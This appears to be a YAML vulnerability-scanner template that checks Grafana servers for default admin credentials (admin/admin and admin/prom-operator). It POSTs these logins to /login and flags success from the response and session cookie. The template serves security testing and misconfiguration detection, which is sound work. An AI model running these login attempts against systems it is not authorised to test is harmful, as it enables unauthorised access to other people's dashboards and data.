expression: r0() || r1()
id: grafana-default-password
info:
  author: For3stCo1d (https://github.com/For3stCo1d)
  name: Grafana Default Password
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"message":') &&
      response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
    request:
      body: '{"user":"admin","password":"admin"}'
      headers:
        Content-Type: application/json
      method: POST
      path: /login
  r1:
    expression: response.status == 200 && response.body.bcontains(b'"message":') &&
      response.body.bcontains(b'"Logged in"') && response.raw_header.bcontains(b'grafana_session')
    request:
      body: '{"user":"admin","password":"prom-operator"}'
      headers:
        Content-Type: application/json
      method: POST
      path: /login
